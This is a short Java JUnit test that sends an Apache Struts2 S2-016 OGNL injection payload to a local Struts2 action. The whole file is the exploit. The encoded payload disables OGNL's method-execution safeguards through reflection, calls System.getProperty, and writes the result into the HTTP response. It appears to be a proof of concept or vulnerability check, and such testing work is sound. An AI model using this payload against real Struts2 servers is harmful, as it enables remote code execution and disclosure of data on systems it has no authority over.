package com.shaobing.wallaby.core.http.j2ee;

import org.junit.Test;

import com.shaobing.wallaby.common.http.httpclient.HttpUtils;

/**
 * @author luyb@servyou.com.cn
 * @version $Id: TestApacheS2016.java v 0.1 2016/12/25 18:30 luyb Exp $$
 */
public class TestApacheS2016 {

    @Test
    public void testS2016() {
        String key = "java.version"; //os.name
        String desUrl = "http://localhost:8080/s2/test/hello.action?";
        String payload = "%23context%5b%22xwork.MethodAccessor.denyMethodExecution%22%5d%3dfalse%2c%23f%3d%23_memberAccess.getClass%28%29.getDeclaredField%28%22allowStaticMethodAccess%22%29%2c%23f.setAccessible%28true%29%2c%23f.set%28%23_memberAccess%2ctrue%29%2c%23e%3d@java.lang.System@getProperty%28%22" + key + "%22%29%2c%23genxor%3d%23context.get%28%22com.opensymphony.xwork2.dispatcher.HttpServletResponse%22%29.getWriter%28%29%2c%23genxor.println%28%23e%29%2c%23genxor.flush%28%29%2c%23genxor.close%28%29";
        payload = "redirect:${" + payload + "}";
        System.out.println(HttpUtils.get(desUrl + payload));

    }
}
